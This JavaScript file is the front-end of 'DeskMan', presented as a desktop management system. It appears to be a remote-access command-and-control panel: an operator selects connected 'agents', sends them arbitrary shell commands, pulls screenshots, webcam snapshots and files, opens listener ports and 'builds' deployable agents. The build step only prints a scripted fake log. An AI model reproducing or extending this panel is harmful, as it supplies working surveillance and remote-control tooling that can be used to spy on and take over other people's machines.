// DeskMan - Desktop Management System
// Main Application Logic

// ============ STATE ============
let agents = [];
let selectedAgent = null;
let currentPath = '';
let systemLogs = [];
let pendingCommands = {};  // command_id -> { resolve, timeout }
let currentGraphLayout = 'circle';
let supabaseReady = false;

// Zoom state
let zoomLevel = 100;
let currentImageDimensions = { width: 0, height: 0 };
let webcamZoomLevel = 100;
let webcamImageDimensions = { width: 0, height: 0 };

// ============ INITIALIZATION ============
document.addEventListener('DOMContentLoaded', async function () {
    supabaseReady = initSupabase();

    if (!supabaseReady) {
        showConfigWarning();
        return;
    }

    addConsoleOutput('DeskMan Desktop Management System v1.0', 'info');
    addConsoleOutput('Connecting to backend...', 'info');

    // Load initial data in parallel
    const [agentList, logs, listeners] = await Promise.all([
        fetchAgents(),
        fetchEventLogs(DESKMAN_CONFIG.MAX_UI_LOGS),
        fetchListeners()
    ]);

    agents = agentList;
    systemLogs = logs.map(l => ({
        time: new Date(l.created_at).toTimeString().slice(0, 8),
        type: l.log_type,
        message: l.message
    }));

    updateAgentCount();
    renderAgentList();
    renderGraph();
    renderLogs();
    renderListeners(listeners);

    if (agents.length > 0) {
        selectAgent(agents[0].agent_id);
        addConsoleOutput(`Connected. ${agents.length} endpoint(s) registered.`, 'success');
    } else {
        addConsoleOutput('No endpoints registered yet. Deploy the agent to connect endpoints.', 'warning');
    }

    await insertEventLog('Dashboard session started', 'info');

    // Set up real-time subscriptions
    setupRealtimeSubscriptions();

    // Tab switching
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            tab.classList.add('active');
            const panelId = tab.dataset.tab + '-panel';
            const panel = document.getElementById(panelId);
            if (panel) panel.classList.add('active');
        });
    });

    // Command input
    document.getElementById('cmd-input').addEventListener('keypress', function (e) {
        if (e.key === 'Enter' && this.value.trim()) {
            executeCommand(this.value.trim());
            this.value = '';
        }
    });

    // Start uptime counter
    startUptimeCounter();

    // Periodic stale-agent check
    setInterval(checkStaleAgents, DESKMAN_CONFIG.AGENT_POLL_INTERVAL);
});

function showConfigWarning() {
    const main = document.querySelector('.c2-main');
    if (!main) return;
    main.innerHTML = `
        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:2rem;text-align:center;">
            <i class="fas fa-exclamation-triangle" style="font-size:3rem;color:var(--yellow-500);margin-bottom:1rem;"></i>
            <h2 style="margin-bottom:0.5rem;">Supabase Not Configured</h2>
            <p style="color:var(--zinc-400);max-width:500px;line-height:1.6;">
                Edit <code style="background:var(--zinc-800);padding:0.2rem 0.4rem;border-radius:4px;">js/config.js</code>
                and set your <strong>SUPABASE_URL</strong> and <strong>SUPABASE_ANON_KEY</strong> from your Supabase project dashboard.
                Then run the migration in <code style="background:var(--zinc-800);padding:0.2rem 0.4rem;border-radius:4px;">supabase/migrations/001_initial_schema.sql</code>
                via the Supabase SQL Editor.
            </p>
        </div>`;
}

// ============ REAL-TIME SUBSCRIPTIONS ============
function setupRealtimeSubscriptions() {
    // Agent changes (new agents, status updates)
    subscribeAgents((payload) => {
        if (payload.eventType === 'INSERT') {
            const agent = payload.new;
            if (!agents.find(a => a.agent_id === agent.agent_id)) {
                agents.push(agent);
            }
            addConsoleOutput(`New endpoint connected: ${agent.hostname} (${agent.ip_address})`, 'success');
            addLocalLog(`Endpoint ${agent.agent_id} (${agent.hostname}) connected`, 'success');
        } else if (payload.eventType === 'UPDATE') {
            const idx = agents.findIndex(a => a.agent_id === payload.new.agent_id);
            if (idx >= 0) agents[idx] = payload.new;
        } else if (payload.eventType === 'DELETE') {
            agents = agents.filter(a => a.agent_id !== payload.old.agent_id);
        }
        updateAgentCount();
        renderAgentList();
        renderGraph();
    });

    // Command results
    subscribeCommandResults((result) => {
        if (selectedAgent && result.agent_id === selectedAgent.agent_id) {
            const output = result.output || '(no output)';
            const exitCode = result.exit_code;
            const type = exitCode === 0 ? 'output' : 'error';
            addConsoleOutput(output, type);
        }
        // Resolve pending command promise if tracked
        const pending = pendingCommands[result.command_id];
        if (pending) {
            clearTimeout(pending.timeout);
            pending.resolve(result);
            delete pendingCommands[result.command_id];
        }
    });

    // Command status changes
    subscribeCommandStatus((cmd) => {
        if (cmd.status === 'running' && selectedAgent && cmd.agent_id === selectedAgent.agent_id) {
            addConsoleOutput('Command executing on endpoint...', 'info');
        }
    });

    // Event logs
    subscribeEventLogs((log) => {
        const entry = {
            time: new Date(log.created_at).toTimeString().slice(0, 8),
            type: log.log_type,
            message: log.message
        };
        systemLogs.push(entry);
        if (systemLogs.length > DESKMAN_CONFIG.MAX_UI_LOGS) systemLogs.shift();
        appendLogEntry(entry);
    });

    // File listings
    subscribeFileListings((payload) => {
        if (payload.eventType === 'INSERT' || payload.eventType === 'UPDATE') {
            const listing = payload.new;
            if (selectedAgent && listing.agent_id === selectedAgent.agent_id && listing.path === currentPath) {
                renderFilesFromEntries(listing.entries);
            }
        }
    });

    // Screenshots
    subscribeScreenshots((screenshot) => {
        if (selectedAgent && screenshot.agent_id === selectedAgent.agent_id) {
            displayScreenshot(screenshot);
        }
    });
}

// ============ AGENT FUNCTIONS ============
function updateAgentCount() {
    const countEl = document.getElementById('agent-count');
    if (countEl) countEl.textContent = agents.length;
    const graphInfo = document.getElementById('graph-info');
    if (graphInfo) graphInfo.textContent = `${agents.filter(a => a.status === 'online').length} endpoint(s) online`;
}

function renderAgentList() {
    const container = document.getElementById('agent-list');
    if (!container) return;

    if (agents.length === 0) {
        container.innerHTML = '<div style="padding:1.5rem;text-align:center;color:var(--zinc-500);font-size:0.875rem;">No endpoints registered</div>';
        return;
    }

    container.innerHTML = agents.map(agent => {
        const lastSeen = agent.last_seen ? timeSince(new Date(agent.last_seen)) : 'never';
        return `
        <div class="agent-item ${selectedAgent && selectedAgent.agent_id === agent.agent_id ? 'active' : ''}"
             onclick="selectAgent('${agent.agent_id}')">
            <div class="agent-icon">
                <i class="fas fa-desktop"></i>
            </div>
            <div class="agent-info">
                <div class="agent-name">${escapeHtml(agent.hostname)}</div>
                <div class="agent-details">
                    <span>${escapeHtml(agent.ip_address || 'unknown')}</span>
                    <span>${escapeHtml(agent.os_info || '')}</span>
                </div>
                <div class="agent-status">
                    <span class="status-dot ${agent.status}"></span>
                    <span style="color: var(--${agent.status === 'online' ? 'green' : agent.status === 'sleeping' ? 'yellow' : 'red'}-500);">${agent.status}</span>
                    <span style="margin-left: auto;">${lastSeen}</span>
                </div>
            </div>
        </div>`;
    }).join('');
}

async function selectAgent(agentId) {
    selectedAgent = agents.find(a => a.agent_id === agentId);
    if (!selectedAgent) return;

    document.getElementById('agent-display').textContent =
        `${selectedAgent.hostname} | ${selectedAgent.username || 'unknown'}`;
    renderAgentList();
    renderGraph();
    addConsoleOutput(`Switched to endpoint: ${selectedAgent.hostname} (${selectedAgent.ip_address})`, 'info');
    await insertEventLog(`Operator switched to endpoint ${selectedAgent.agent_id}`, 'info');

    // Load file listing for default path
    const sysInfo = selectedAgent.system_info || {};
    currentPath = sysInfo.home_dir || (selectedAgent.os_info && selectedAgent.os_info.includes('Windows') ? 'C:\\Users' : '/home');
    document.getElementById('current-path').value = currentPath;
    loadFileListing(currentPath);
}

function checkStaleAgents() {
    const now = new Date();
    agents.forEach(agent => {
        if (agent.status === 'online' && agent.last_seen) {
            const diff = (now - new Date(agent.last_seen)) / 1000;
            if (diff > DESKMAN_CONFIG.AGENT_STALE_THRESHOLD) {
                agent.status = 'offline';
            }
        }
    });
    renderAgentList();
    renderGraph();
}

// ============ GRAPH FUNCTIONS ============
function renderGraph() {
    const container = document.getElementById('graph-view');
    if (!container) return;
    const existing = container.querySelectorAll('.graph-node, .graph-edge');
    existing.forEach(el => el.remove());

    const rect = container.getBoundingClientRect();
    const width = rect.width;
    const height = rect.height;
    const centerX = width / 2;
    const centerY = height / 2;

    // Server node
    const serverNode = document.createElement('div');
    serverNode.className = 'graph-node server';
    serverNode.innerHTML = '<i class="fas fa-server"></i>';
    serverNode.style.left = (centerX - 22) + 'px';
    serverNode.style.top = (centerY - 22) + 'px';
    container.appendChild(serverNode);

    if (agents.length === 0) return;

    const radius = Math.min(width, height) * 0.35;
    const nodeSize = 36;
    const halfNode = nodeSize / 2;

    if (currentGraphLayout === 'circle') {
        agents.forEach((agent, i) => {
            const angle = (i * 2 * Math.PI) / agents.length - Math.PI / 2;
            const x = centerX + radius * Math.cos(angle) - halfNode;
            const y = centerY + radius * Math.sin(angle) - halfNode;

            const node = document.createElement('div');
            node.className = `graph-node agent ${agent.status}`;
            node.innerHTML = '<i class="fas fa-desktop"></i>';
            node.style.left = x + 'px';
            node.style.top = y + 'px';
            node.title = `${agent.hostname}\n${agent.ip_address || ''}`;
            node.onclick = () => selectAgent(agent.agent_id);
            node.style.cursor = 'pointer';
            container.appendChild(node);

            const edge = document.createElement('div');
            edge.className = 'graph-edge';
            const edgeX = centerX + (radius - halfNode) * Math.cos(angle);
            const edgeY = centerY + (radius - halfNode) * Math.sin(angle);
            const length = Math.sqrt(Math.pow(edgeX - centerX, 2) + Math.pow(edgeY - centerY, 2));
            const rotation = Math.atan2(edgeY - centerY, edgeX - centerX) * 180 / Math.PI;

            edge.style.left = centerX + 'px';
            edge.style.top = centerY + 'px';
            edge.style.width = length + 'px';
            edge.style.transform = `rotate(${rotation}deg)`;
            edge.classList.toggle('active', agent.status === 'online');
            container.insertBefore(edge, serverNode);
        });
    } else {
        const agentSpacing = Math.min(width / (agents.length + 1), 70);
        const startX = centerX - ((agents.length - 1) * agentSpacing) / 2;
        const agentY = centerY + radius * 0.6;

        agents.forEach((agent, i) => {
            const x = startX + i * agentSpacing - halfNode;
            const y = agentY - halfNode;

            const node = document.createElement('div');
            node.className = `graph-node agent ${agent.status}`;
            node.innerHTML = '<i class="fas fa-desktop"></i>';
            node.style.left = x + 'px';
            node.style.top = y + 'px';
            node.title = `${agent.hostname}\n${agent.ip_address || ''}`;
            node.onclick = () => selectAgent(agent.agent_id);
            node.style.cursor = 'pointer';
            container.appendChild(node);

            const edge = document.createElement('div');
            edge.className = 'graph-edge';
            const sx = centerX;
            const sy = centerY + 22;
            const ax = x + halfNode;
            const ay = y + halfNode;
            const length = Math.sqrt(Math.pow(ax - sx, 2) + Math.pow(ay - sy, 2));
            const rotation = Math.atan2(ay - sy, ax - sx) * 180 / Math.PI;

            edge.style.left = sx + 'px';
            edge.style.top = sy + 'px';
            edge.style.width = length + 'px';
            edge.style.transform = `rotate(${rotation}deg)`;
            edge.classList.toggle('active', agent.status === 'online');
            container.insertBefore(edge, serverNode);
        });
    }
}

function arrangeGraph(layout) {
    currentGraphLayout = layout;
    addLocalLog(`Graph layout changed to: ${layout}`, 'info');
    renderGraph();
}

function refreshGraph() {
    addLocalLog('Graph refreshed', 'info');
    renderGraph();
}

window.addEventListener('resize', () => renderGraph());

// ============ CONSOLE FUNCTIONS ============
function addConsoleOutput(text, type = 'output') {
    const container = document.getElementById('console-output');
    if (!container) return;
    const now = new Date();
    const time = now.toTimeString().slice(0, 8);

    const line = document.createElement('div');
    line.className = 'output-line';
    line.innerHTML = `
        <span class="output-timestamp">[${time}]</span>
        <div class="output-content">
            <span class="output-type type-${type}">[${type.toUpperCase()}]</span>
            <span class="type-output">${escapeHtml(text).replace(/\n/g, '<br>')}</span>
        </div>`;
    container.appendChild(line);

    // Trim old lines
    while (container.children.length > DESKMAN_CONFIG.MAX_CONSOLE_LINES) {
        container.removeChild(container.firstChild);
    }
    container.scrollTop = container.scrollHeight;
}

async function executeCommand(cmd) {
    if (!selectedAgent) {
        addConsoleOutput('No endpoint selected. Select an endpoint from the sidebar.', 'error');
        return;
    }

    if (selectedAgent.status === 'offline') {
        addConsoleOutput(`Endpoint ${selectedAgent.hostname} is offline. Command not sent.`, 'error');
        return;
    }

    addConsoleOutput(`> ${cmd}`, 'task');

    // Local-only commands
    if (cmd.toLowerCase() === 'clear') {
        clearConsole();
        return;
    }
    if (cmd.toLowerCase() === 'help') {
        addConsoleOutput(
            'Available Commands:\n' +
            '  whoami      - Display current user\n' +
            '  hostname    - Display system hostname\n' +
            '  osinfo      - Display OS information\n' +
            '  sysinfo     - Full system information\n' +
            '  netinfo     - Display network information\n' +
            '  uptime      - Show system uptime\n' +
            '  processes   - List running processes\n' +
            '  drives      - List available drives\n' +
            '  ls [path]   - List directory contents\n' +
            '  download    - Download file from endpoint\n' +
            '  upload      - Upload file to endpoint\n' +
            '  screenshot  - Capture endpoint screen\n' +
            '  shell <cmd> - Execute shell command\n' +
            '  clear       - Clear console\n' +
            '  help        - Show this help', 'output');
        return;
    }

    // Send command to Supabase
    addConsoleOutput('Sending command to endpoint...', 'info');
    const cmdRecord = await sendCommand(selectedAgent.agent_id, cmd);

    if (!cmdRecord) {
        addConsoleOutput('Failed to send command. Check your connection.', 'error');
        return;
    }

    await insertEventLog(`Command sent to ${selectedAgent.agent_id}: ${cmd}`, 'info', selectedAgent.agent_id);

    // Wait for result via real-time subscription (with timeout)
    const timeoutMs = 30000;
    const resultPromise = new Promise((resolve) => {
        const timeout = setTimeout(() => {
            delete pendingCommands[cmdRecord.id];
            resolve(null);
        }, timeoutMs);
        pendingCommands[cmdRecord.id] = { resolve, timeout };
    });

    const result = await resultPromise;
    if (!result) {
        addConsoleOutput('Command timed out waiting for response. The endpoint may be slow or offline.', 'warning');
    }
}

function executeQuickCommand(cmd) {
    document.getElementById('cmd-input').value = cmd;
    executeCommand(cmd);
}

function clearConsole() {
    const container = document.getElementById('console-output');
    if (container) container.innerHTML = '';
    addConsoleOutput('Console cleared', 'info');
}

// ============ SCREENSHOT FUNCTIONS ============
async function takeScreenshot() {
    if (!selectedAgent) {
        addConsoleOutput('No endpoint selected.', 'error');
        return;
    }
    addConsoleOutput('Requesting screenshot from endpoint...', 'info');
    await requestScreenshot(selectedAgent.agent_id);
    await insertEventLog(`Screenshot requested from ${selectedAgent.agent_id}`, 'info', selectedAgent.agent_id);
}

function displayScreenshot(screenshot) {
    const placeholder = document.getElementById('screenshot-placeholder');
    const imageContainer = document.getElementById('screenshot-image-container');
    if (!placeholder || !imageContainer) return;

    const url = getScreenshotUrl(screenshot.storage_path);
    if (!url) return;

    const img = imageContainer.querySelector('img');
    if (img) {
        img.src = url;
        img.onload = function () {
            currentImageDimensions = { width: this.naturalWidth, height: this.naturalHeight };
        };
    }
    placeholder.style.display = 'none';
    imageContainer.style.display = 'block';
    addConsoleOutput('Screenshot received.', 'success');
    addLocalLog('Screenshot captured from endpoint', 'success');
}

function saveScreenshot() {
    const imageContainer = document.getElementById('screenshot-image-container');
    if (!imageContainer || imageContainer.style.display === 'none') {
        addConsoleOutput('No screenshot to save. Click Capture first.', 'warning');
        return;
    }
    const img = imageContainer.querySelector('img');
    if (img && img.src) {
        const a = document.createElement('a');
        a.href = img.src;
        a.download = `screenshot_${selectedAgent ? selectedAgent.hostname : 'unknown'}_${Date.now()}.png`;
        a.click();
        addLocalLog('Screenshot saved to downloads', 'success');
    }
}

function refreshScreenshot() {
    if (selectedAgent) takeScreenshot();
}

// ============ WEBCAM FUNCTIONS ============
async function takeWebcamSnapshot() {
    if (!selectedAgent) {
        addConsoleOutput('No endpoint selected.', 'error');
        return;
    }
    addConsoleOutput('Requesting webcam snapshot from endpoint...', 'info');
    await requestWebcam(selectedAgent.agent_id);
    await insertEventLog(`Webcam snapshot requested from ${selectedAgent.agent_id}`, 'info', selectedAgent.agent_id);
}

function saveWebcamImage() {
    const imageContainer = document.getElementById('webcam-image-container');
    if (!imageContainer || imageContainer.style.display === 'none') {
        addConsoleOutput('No webcam image to save.', 'warning');
        return;
    }
    const img = imageContainer.querySelector('img');
    if (img && img.src) {
        const a = document.createElement('a');
        a.href = img.src;
        a.download = `webcam_${selectedAgent ? selectedAgent.hostname : 'unknown'}_${Date.now()}.png`;
        a.click();
        addLocalLog('Webcam image saved', 'success');
    }
}

function refreshWebcam() {
    if (selectedAgent) takeWebcamSnapshot();
}

// ============ ZOOM FUNCTIONS ============
function zoomIn() {
    if (zoomLevel < 300) { zoomLevel += 10; applyZoom(); }
}
function zoomOut() {
    if (zoomLevel > 10) { zoomLevel -= 10; applyZoom(); }
}
function resetZoom() {
    zoomLevel = 100; applyZoom();
}
function applyZoom() {
    const c = document.getElementById('screenshot-image-container');
    const d = document.getElementById('zoom-display');
    if (c && c.style.display !== 'none') {
        c.style.transform = `scale(${zoomLevel / 100})`;
    }
    if (d) d.textContent = `${zoomLevel}%`;
}
function fitToScreen() {
    if (!currentImageDimensions.width || !currentImageDimensions.height) return;
    const v = document.getElementById('screenshot-viewer');
    if (!v) return;
    const wr = (v.clientWidth - 10) / currentImageDimensions.width;
    const hr = (v.clientHeight - 10) / currentImageDimensions.height;
    zoomLevel = Math.round(Math.min(wr, hr) * 100);
    applyZoom();
}

function zoomInWebcam() {
    if (webcamZoomLevel < 300) { webcamZoomLevel += 10; applyWebcamZoom(); }
}
function zoomOutWebcam() {
    if (webcamZoomLevel > 10) { webcamZoomLevel -= 10; applyWebcamZoom(); }
}
function resetWebcamZoom() {
    webcamZoomLevel = 100; applyWebcamZoom();
}
function applyWebcamZoom() {
    const c = document.getElementById('webcam-image-container');
    const d = document.getElementById('webcam-zoom-display');
    if (c && c.style.display !== 'none') {
        c.style.transform = `scale(${webcamZoomLevel / 100})`;
    }
    if (d) d.textContent = `${webcamZoomLevel}%`;
}
function fitWebcamToScreen() {
    if (!webcamImageDimensions.width || !webcamImageDimensions.height) return;
    const v = document.getElementById('webcam-viewer');
    if (!v) return;
    const wr = (v.clientWidth - 10) / webcamImageDimensions.width;
    const hr = (v.clientHeight - 10) / webcamImageDimensions.height;
    webcamZoomLevel = Math.round(Math.min(wr, hr) * 100);
    applyWebcamZoom();
}

// ============ FILE MANAGER FUNCTIONS ============
async function loadFileListing(path) {
    if (!selectedAgent) return;

    // Try cached listing first
    const cached = await fetchFileListing(selectedAgent.agent_id, path);
    if (cached) {
        renderFilesFromEntries(cached.entries);
    }

    // Request fresh listing from agent
    await requestFileListing(selectedAgent.agent_id, path);
}

function renderFilesFromEntries(entries) {
    const container = document.getElementById('file-list-body');
    if (!container) return;

    if (!entries || entries.length === 0) {
        container.innerHTML = '<div style="padding:2rem;text-align:center;color:var(--zinc-500);">No files found or waiting for endpoint response...</div>';
        document.getElementById('file-count').textContent = '0 items';
        return;
    }

    container.innerHTML = entries.map(file => `
        <div class="file-item ${file.type === 'folder' ? 'folder' : ''}"
             onclick="${file.type === 'folder' ? `navigateToFolder('${escapeHtml(file.name)}')` : `downloadFile('${escapeHtml(file.name)}')`}">
            <div class="file-icon"><i class="fas ${file.type === 'folder' ? 'fa-folder' : getFileIcon(file.name)}"></i></div>
            <div style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(file.name)}</div>
            <div>${escapeHtml(file.size || '-')}</div>
            <div>${escapeHtml(file.type || '')}</div>
            <div>${escapeHtml(file.date || '')}</div>
        </div>
    `).join('');

    document.getElementById('file-count').textContent = `${entries.length} items`;
}

function getFileIcon(filename) {
    const ext = (filename.split('.').pop() || '').toLowerCase();
    const icons = {
        'txt': 'fa-file-alt', 'md': 'fa-file-alt', 'log': 'fa-file-alt',
        'pdf': 'fa-file-pdf',
        'doc': 'fa-file-word', 'docx': 'fa-file-word',
        'xls': 'fa-file-excel', 'xlsx': 'fa-file-excel',
        'ppt': 'fa-file-powerpoint', 'pptx': 'fa-file-powerpoint',
        'png': 'fa-file-image', 'jpg': 'fa-file-image', 'jpeg': 'fa-file-image', 'gif': 'fa-file-image',
        'zip': 'fa-file-archive', 'rar': 'fa-file-archive', '7z': 'fa-file-archive',
        'exe': 'fa-cog', 'msi': 'fa-cog',
        'html': 'fa-file-code', 'css': 'fa-file-code', 'js': 'fa-file-code', 'py': 'fa-file-code', 'json': 'fa-file-code'
    };
    return icons[ext] || 'fa-file';
}

function navigateToFolder(folderName) {
    if (folderName === '..') { navigateUp(); return; }

    const sep = currentPath.includes('/') ? '/' : '\\';
    const newPath = currentPath.endsWith(sep) ? currentPath + folderName : currentPath + sep + folderName;
    currentPath = newPath;
    document.getElementById('current-path').value = currentPath;
    loadFileListing(currentPath);
    addLocalLog(`Navigated to: ${currentPath}`, 'info');
}

function navigateUp() {
    const sep = currentPath.includes('/') ? '/' : '\\';
    const parts = currentPath.split(sep);
    if (parts.length > 1) {
        parts.pop();
        currentPath = parts.join(sep) || (sep === '/' ? '/' : 'C:\\');
        document.getElementById('current-path').value = currentPath;
        loadFileListing(currentPath);
    }
}

function navigateBack() { navigateUp(); }

function refreshFileManager() {
    addLocalLog('File manager refreshed', 'info');
    loadFileListing(currentPath);
}

async function downloadFile(filename) {
    if (!selectedAgent) return;
    addConsoleOutput(`Requesting download: ${filename}...`, 'info');
    const sep = currentPath.includes('/') ? '/' : '\\';
    const fullPath = currentPath + sep + filename;
    await sendCommand(selectedAgent.agent_id, `download ${fullPath}`);
    await insertEventLog(`File download requested: ${fullPath}`, 'info', selectedAgent.agent_id);
}

async function uploadFile() {
    if (!selectedAgent) {
        addConsoleOutput('No endpoint selected.', 'error');
        return;
    }
    addConsoleOutput('Upload: use the agent CLI or send a file via the upload command.', 'info');
}

// ============ LOGS FUNCTIONS ============
function renderLogs() {
    const container = document.getElementById('logs-output');
    if (!container) return;
    container.innerHTML = systemLogs.map(log => `
        <div class="output-line">
            <span class="output-timestamp">[${log.time}]</span>
            <div class="output-content">
                <span class="output-type type-${log.type}">[${log.type.toUpperCase()}]</span>
                <span class="type-output">${escapeHtml(log.message)}</span>
            </div>
        </div>
    `).join('');
    container.scrollTop = container.scrollHeight;
}

function appendLogEntry(entry) {
    const container = document.getElementById('logs-output');
    if (!container) return;
    const div = document.createElement('div');
    div.className = 'output-line';
    div.innerHTML = `
        <span class="output-timestamp">[${entry.time}]</span>
        <div class="output-content">
            <span class="output-type type-${entry.type}">[${entry.type.toUpperCase()}]</span>
            <span class="type-output">${escapeHtml(entry.message)}</span>
        </div>`;
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
}

function addLocalLog(message, type = 'info') {
    const now = new Date();
    const time = now.toTimeString().slice(0, 8);
    const entry = { time, type, message };
    systemLogs.push(entry);
    if (systemLogs.length > DESKMAN_CONFIG.MAX_UI_LOGS) systemLogs.shift();
    appendLogEntry(entry);
}

async function clearLogs() {
    systemLogs.length = 0;
    const container = document.getElementById('logs-output');
    if (container) container.innerHTML = '';
    await clearEventLogs();
    addLocalLog('Logs cleared', 'info');
}

async function exportLogs() {
    const text = systemLogs.map(l => `[${l.time}] [${l.type.toUpperCase()}] ${l.message}`).join('\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `deskman_logs_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(a.href);
    addLocalLog('Logs exported to file', 'success');
}

// ============ SETTINGS FUNCTIONS ============
function toggleSettings() {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.getElementById('settings-panel').classList.add('active');
}

let serverUptimeSeconds = 0;
function startUptimeCounter() {
    setInterval(() => {
        serverUptimeSeconds++;
        const h = Math.floor(serverUptimeSeconds / 3600);
        const m = Math.floor((serverUptimeSeconds % 3600) / 60);
        const s = serverUptimeSeconds % 60;
        const uptime = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        const el = document.getElementById('server-uptime');
        if (el) el.textContent = uptime;
    }, 1000);
}

function renderListeners(listeners) {
    const container = document.getElementById('listeners-list');
    if (!container) return;

    const countEl = document.getElementById('listeners-count');
    const activeListeners = listeners.filter(l => l.status === 'active');
    if (countEl) countEl.textContent = `Active Listeners (${activeListeners.length})`;

    // Update header info
    const listenerInfo = document.getElementById('listener-info');
    if (listenerInfo) {
        if (activeListeners.length > 0) {
            listenerInfo.textContent = `Listening on: ${activeListeners.map(l => l.port).join(', ')}`;
        } else {
            listenerInfo.textContent = 'No active listeners';
        }
    }

    container.innerHTML = activeListeners.map(l => `
        <div style="padding:0.75rem 1rem;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;align-items:center;">
            <div>
                <div style="font-weight:500;color:var(--text-primary);">Port ${l.port}</div>
                <div style="font-size:0.75rem;color:var(--green-500);">&#9679; ${l.protocol.toUpperCase()} Active</div>
            </div>
            <button class="btn btn-secondary" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="handleStopListener(${l.port})">
                <i class="fas fa-stop"></i> Stop
            </button>
        </div>
    `).join('');
}

async function handleAddListener() {
    const input = document.getElementById('new-listener-port');
    if (!input) return;
    const port = parseInt(input.value);
    if (!port || port < 1 || port > 65535) {
        addConsoleOutput('Invalid port number.', 'error');
        return;
    }
    const listener = await addListener(port);
    if (listener) {
        await insertEventLog(`Listener started on port ${port}`, 'success');
        const listeners = await fetchListeners();
        renderListeners(listeners);
    }
}

async function handleStopListener(port) {
    await stopListener(port);
    await insertEventLog(`Listener on port ${port} stopped`, 'warning');
    const listeners = await fetchListeners();
    renderListeners(listeners);
}

async function handleBuildAgent() {
    const logContainer = document.getElementById('build-log');
    if (!logContainer) return;

    const serverUrl = document.getElementById('build-server-url')?.value || DESKMAN_CONFIG.SUPABASE_URL;
    const serverKey = document.getElementById('build-server-key')?.value || 'SERVICE_ROLE_KEY';

    logContainer.innerHTML = '';

    const steps = [
        { msg: 'Preparing agent configuration...', type: 'info', delay: 300 },
        { msg: `Server URL: ${serverUrl}`, type: 'info', delay: 800 },
        { msg: 'Generating agent package...', type: 'info', delay: 1500 },
        { msg: 'Bundling dependencies (supabase-py, psutil, mss, Pillow)...', type: 'info', delay: 2500 },
        { msg: 'Creating agent installer package...', type: 'warning', delay: 3500 },
        { msg: 'Build completed successfully!', type: 'success', delay: 4500 },
        { msg: 'Output: deskman_agent/ (ready to deploy)', type: 'success', delay: 5000 }
    ];

    steps.forEach((step) => {
        setTimeout(() => {
            const line = document.createElement('div');
            line.className = `log-line ${step.type}`;
            line.textContent = `[${new Date().toTimeString().slice(0, 8)}] ${step.msg}`;
            logContainer.appendChild(line);
            logContainer.scrollTop = logContainer.scrollHeight;
        }, step.delay);
    });

    await insertEventLog('Agent build initiated', 'info');
}

// ============ MODAL FUNCTIONS ============
function showLogoutModal() {
    const modal = document.getElementById('logoutModal');
    if (modal) modal.classList.add('active');
}

function hideLogoutModal() {
    const modal = document.getElementById('logoutModal');
    if (modal) modal.classList.remove('active');
}

async function confirmLogout() {
    await insertEventLog('Operator logged out', 'info');
    document.body.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:var(--zinc-950);color:var(--zinc-400);flex-direction:column;gap:1rem;">
            <i class="fas fa-check-circle" style="font-size:3rem;color:var(--green-500);"></i>
            <h2>Session Terminated</h2>
            <p>You have been successfully logged out.</p>
            <button onclick="location.reload()" class="btn" style="margin-top:1rem;padding:0.5rem 1rem;border-radius:0.375rem;background:rgba(39,39,42,0.6);color:var(--text-primary);border:none;cursor:pointer;font-family:'Inter',sans-serif;">
                <i class="fas fa-redo"></i> Return to Dashboard
            </button>
        </div>`;
}

// Close modal on outside click
document.addEventListener('click', function (e) {
    const modal = document.getElementById('logoutModal');
    if (modal && e.target === modal) hideLogoutModal();
});

// ============ UTILITY FUNCTIONS ============
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function timeSince(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    if (seconds < 5) return 'just now';
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    const days = Math.floor(hours / 24);
    return `${days}d ago`;
}
